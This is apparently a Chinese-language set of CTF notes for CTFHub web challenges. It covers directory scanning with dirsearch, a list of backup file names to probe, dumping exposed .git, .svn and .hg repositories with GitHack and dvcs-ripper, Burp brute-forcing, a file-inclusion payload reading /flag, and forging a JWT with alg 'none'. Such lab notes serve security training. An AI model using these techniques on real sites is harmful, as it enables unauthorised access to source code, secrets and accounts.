# 信息泄露
使用 `dirsearch.py`, 可以直接安装(需要依赖`setuptools`)
```
pip install dirsearch setuptools
dirsearch -u ${url}
```

## 备份文件下载
可以通过在 `url` 中添加备份文件路径来下载备份文件。常见地址如下：
```
index.php.bak
.index.php.swp

web.tar
web.tar.gz
web.zip
web.rar

website.tar
website.tar.gz
website.zip
website.rar

backup.tar
backup.tar.gz
backup.zip
backup.rar

back.tar
back.tar.gz
back.zip
back.rar

www.tar
www.tar.gz
www.zip
www.rar

wwwroot.tar
wwwroot.tar.gz
wwwroot.zip
wwwroot.rar

temp.tar
temp.tar.gz
temp.zip
temp.rar
```


## Git 泄露

一定要用 `BugScanTeam/GitHack`，git clone 后使用 python2 打开。
```
C:\Python27\python.exe .\GitHack\GitHack.py http://challenge-043212857b4db3fb.sandbox.ctfhub.com:10800/.git
```

下载后使用以下命令查看文件变化
```
git log
git diff ${commit}
git checkout ${commit}
git stash pop
```

## SVN 泄露
用 dirsearch 扫描目录查看是否有 .svn
需要用到 perl, 这里建议安装 wsl 后直接在虚拟机 ubuntu 中运行：
```sh
# 下载 dvcs-ripper
git clone https://github.com/kost/dvcs-ripper.git
# 安装依赖
sudo apt-get install perl libio-socket-ssl-perl libdbd-sqlite3-perl libclass-dbi-perl libio-all-lwp-perl
# 使用 rip
./rip-svn.pl -v -u http://challenge-7f8cf35aab6a769d.sandbox.ctfhub.com:10800/.svn/
# 安装依赖 tree 来查看目录
sudo apt install tree
tree
# 使用 cat 查看文件
cat ${./xxx/flag}
```

## Hg 泄露
还是使用 dirsearch 查看到有 .hg 文件夹
然后使用 dvcs-ripper 下载 .hg 文件夹
```sh
./dvcs-ripper/rip-hg.pl -v -u http://challenge-5cff321a7eb51aaf.sandbox.ctfhub.com:10800/.hg
# 使用 grep 抓取目录文件名
rep -a -r flag
# 找到目录文件名后，直接访问 url+'/'+文件名
http://challenge-5cff321a7eb51aaf.sandbox.ctfhub.com:10800/flag_2041319478.txt
```

## 密码口令
建议使用 burpsuit 来爆破（不容易出现 503）
多个payload需要选择爆破模式（Cluster Bomb）

# php

## easy_include
直接在url中加上 /?inc=/flag

## JWT

Header.Payload.Signature

每部分都是 base64 编码。

Header: {"typ":"JWT","alg":"HS256"}
Payload: {"username":"admin","password":"password","role":"admin"}
Signature: 签名

可以尝试使用 alg:'none', Signature 空着来作为自己的 jwt
